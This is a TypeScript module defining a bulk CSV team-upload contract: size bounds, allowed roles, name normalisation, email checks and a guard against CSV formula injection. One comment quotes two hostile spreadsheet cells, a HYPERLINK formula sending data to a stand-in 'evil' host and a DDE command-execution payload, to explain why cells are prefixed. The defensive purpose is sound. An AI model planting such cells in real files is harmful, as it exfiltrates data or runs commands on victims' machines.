// ── THE BULK-UPLOAD CONTRACT ─────────────────────────────────────────────────────────────
//
// The bounds, the accepted vocabularies, and the name normalisation, in ONE module, because the
// validator, the template generator and (later) the Team-service plan all have to agree. This
// module is the enforcement of that shared contract.
//
import { TEAM_ROLES } from "@praimana/shared";

// ⚠ THE TEMPLATE IS GENERATED FROM THESE CONSTANTS, not written alongside them. A template that
// says "80 rows maximum" while the validator enforces 60 is worse than no template: the operator
// fills in 80 rows, and the file is refused for a reason the documentation denied.

/**
 * ⚠ `MAX_BULK_ROWS + MAX_NEW_TEAMS_PER_FILE` MUST STAY ≤ 100.
 *
 * Not a style preference, 100 is DynamoDB's hard item ceiling for `TransactWriteItems`, and the
 * atomicity guarantee ("either every team and every invitation row exists, or none
 * does") is only available inside one transaction. Raise either number past the sum and the
 * transaction stops being possible, so the guarantee silently degrades into a partially-applied
 * file, which is the exact failure mode validate-all-then-reject exists to prevent.
 *
 * `contract.test.ts` asserts the sum. That test is what catches a future edit to either constant.
 */
export const MAX_BULK_ROWS = 80;
export const MAX_NEW_TEAMS_PER_FILE = 20;

/** DynamoDB's `TransactWriteItems` item ceiling. Stated so the assertion can name its source. */
export const TRANSACT_ITEM_CEILING = 100;

/**
 * Refused BEFORE decode, so a hostile file costs a length check rather than a UTF-8 decode plus a
 * parse. 80 rows × ~320 bytes ≈ 26 KiB, so this is ~2.4× headroom.
 */
export const MAX_FILE_BYTES = 64 * 1024;

/** Above the 254-char email ceiling, below anything worth a regex. */
export const MAX_CELL_CHARS = 320;

/** A bounded error response. Beyond this the result carries `truncated: true`. */
export const MAX_ERRORS_REPORTED = 100;

/** Matches `team.create`'s own `z.string().min(1).max(100)`, so the two cannot disagree. */
export const MAX_TEAM_NAME_CHARS = 100;

/** RFC 5321's practical ceiling, and what the provisioner already applies. */
export const MAX_EMAIL_CHARS = 254;

/**
 * ⚠ TWO ROLES ONLY, AND THIS IS NARROWER THAN `ROLE_GRANTS` ALLOWS, ON PURPOSE.
 *
 * A FACILITATOR may interactively grant FACILITATOR, JUDGE, EXECUTIVE and PARTICIPANT
 * (`the team service's `routes.ts`:49-55`). A CSV may name only the last two:
 *
 *   - ADMIN and FACILITATOR are platform-scoped and must not hold a team-membership row, which is
 *     the only thing a bulk file produces.
 *   - JUDGE's `WORKSHOP_POLICY` is `REQUIRED`, it needs a workshop the CSV has no column for, so
 *     a judge created here would be a judge who can see and score nothing.
 *
 * The deeper reason is blast radius: this is one request that creates up to eighty accounts, and
 * `user-access/src/routes.ts:250-253` already records what an unnarrowed version costs, a caller
 * who "could mint an ADMIN account's password". One cell in row 47 must never be able to do that.
 */
export const BULK_PLATFORM_ROLES = ["PARTICIPANT", "EXECUTIVE"] as const;
export type BulkPlatformRole = (typeof BULK_PLATFORM_ROLES)[number];

/**
 * The team roles a CSV may name. Absent → the service's own default (BUILDER).
 *
 * ⚠ DERIVED FROM `TEAM_ROLES`, NOT HARDCODED, and it was hardcoded, wrongly, until an upload
 * rejected six valid rows.
 *
 * I wrote `["LEAD", "BUILDER", "EXECUTIVE", "COACH"]` from the doc comment at
 * `the team service's `domain.ts`:69`, which lists four. The canonical `TeamRole` type has SIX -
 * `PRODUCT` and `DESIGNER` as well, and the invite form's dropdown has offered all six all along. So
 * the bulk validator refused roles the interactive form accepts, and the reported error told the
 * operator their file was wrong when the validator was.
 *
 * Deriving from the single source makes that drift impossible rather than merely fixed: adding a
 * seventh role to `TEAM_ROLES` now works in a CSV with no edit here, which is the property that was
 * missing.
 */
export const BULK_TEAM_ROLES = TEAM_ROLES.map((r) => r.role) as readonly string[];
export type BulkTeamRole = string;

/**
 * The v1 header set. `team_role` is the only optional column.
 *
 * ⚠ THE HEADER ROW *IS* THE VERSION, AND AN UNKNOWN COLUMN IS A HARD ERROR. A
 * silently ignored `send_at` column is a facilitator who believes they scheduled something. A
 * future column ships as v2 with a new accepted set while this one stays accepted forever, so old
 * files keep working, an allowlist, not "sanitise and hope".
 */
export const REQUIRED_COLUMNS = ["team_name", "email", "platform_role"] as const;
export const OPTIONAL_COLUMNS = ["team_role"] as const;
export const KNOWN_COLUMNS: readonly string[] = [...REQUIRED_COLUMNS, ...OPTIONAL_COLUMNS];

/** Zero-width and BOM characters, which are invisible and therefore never a real name difference. */
const ZERO_WIDTH = /[\u200B-\u200D\uFEFF\u2060]/g;

/**
 * The key two team names are compared BY, never displayed.
 *
 * ⚠ NORMALISATION IS THE WHOLE OF DESIGN DECISION 3. "match an existing team by name"
 * is only meaningful once "same name" is defined, and a facilitator's spreadsheet supplies the
 * hard cases: a trailing space from a copy-paste, a non-breaking space from a web page, `Team
 * Alpha` in one row and `team alpha` in the next. All of those are one team, because treating them
 * as different silently creates a near-duplicate team and splits a real team in half.
 *
 * NFKC first, so a non-breaking space becomes a plain one and full-width characters fold to ASCII;
 * then drop the invisibles; then collapse runs; then casefold. `toLowerCase()` is the casefold -
 * imperfect for a few scripts (ﬁ, ς) but the comparison only has to be CONSISTENT, and the raw
 * spelling is what gets stored and shown.
 */
export function normalizeTeamName(raw: string): string {
  return raw
    .normalize("NFKC")
    .replace(ZERO_WIDTH, "")
    .trim()
    .replace(/\s+/g, " ")
    .toLowerCase();
}

/** Emails are stored lowercased everywhere in the platform; match that here or dedup misses. */
export function normalizeEmail(raw: string): string {
  return raw.normalize("NFKC").replace(ZERO_WIDTH, "").trim().toLowerCase();
}

/**
 * ── ⚠ CSV FORMULA INJECTION, THE REAL INJECTION RISK ON THIS FEATURE ──────────────────
 *
 * The platform stores in DynamoDB, so there is no SQL on this path to inject into, and every
 * DynamoDB expression in the services binds its values through `ExpressionAttributeValues`
 * (audited: the only interpolated parts are attribute NAMES from a hardcoded list or a
 * zod-validated schema). The desktop's SQLite is parameterised throughout.
 *
 * ⚠ BUT CSV IS NOT A DATA FORMAT TO A SPREADSHEET, IT IS A PROGRAM. A cell whose first character
 * is `=`, `+`, `-`, `@`, a tab or a CR is evaluated as a FORMULA by Excel, LibreOffice and Sheets.
 * That matters here because the failure report is a CSV **containing the operator's own rows echoed
 * back**, which they then open in Excel. A team named
 *
 *     =HYPERLINK("http://evil/?"&A1,"Click")     or     =cmd|'/c calc'!A0
 *
 * would be a live formula in the report, data exfiltration or command execution (DDE) on the
 * facilitator's machine, triggered by them doing the obvious thing with a file the product gave them.
 *
 * ⚠ AND THE FACILITATOR IS NOT THE ATTACKER HERE. They may be pasting a roster from a spreadsheet
 * somebody else sent them, so the hostile cell can arrive without anyone in the chain intending it.
 *
 * THE FIX IS PREFIXING, NOT STRIPPING. A leading `'` makes a spreadsheet treat the cell as text and
 * is not displayed, so the value is preserved exactly, stripping the character would silently
 * corrupt a legitimate name (a team really called "+1 Crew"). Then normal RFC 4180 quoting is
 * applied on top, because the two problems are different: quoting protects the PARSER, prefixing
 * protects the SPREADSHEET.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function csvCell(value: string): string {
  const guarded = FORMULA_LEAD.test(value) ? `'${value}` : value;
  // RFC 4180: quote when the value contains a quote, comma, or a line break; double any quote.
  return /["\n,\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}

/**
 * Deliberately NOT an RFC 5322 regex.
 *
 * ⚠ NO NESTED QUANTIFIERS, this runs on untrusted operator input, and the classic
 * "comprehensive email regex" is a catastrophic-backtracking DoS waiting for a crafted cell. The
 * checks are structural and linear: one `@`, something either side, no whitespace, no comma
 * (which would mean a quoting mistake), and a dot in the domain. Cognito is the real
 * authority, `user-access` rejects what it will not accept, so this only has to catch the
 * mistakes a spreadsheet actually produces.
 */
export function emailRejectionReason(email: string): string | null {
  if (!email) return "email is required";
  if (email.length > MAX_EMAIL_CHARS) return `email is longer than ${MAX_EMAIL_CHARS} characters`;
  if (/\s/.test(email)) return "email contains whitespace";
  if (email.includes(",")) return "email contains a comma, check the quoting in this row";
  const at = email.indexOf("@");
  if (at < 1) return "email is missing the part before @";
  if (at !== email.lastIndexOf("@")) return "email has more than one @";
  const domain = email.slice(at + 1);
  if (!domain.includes(".")) return "email domain has no dot";
  if (domain.startsWith(".") || domain.endsWith(".")) return "email domain starts or ends with a dot";
  return null;
}
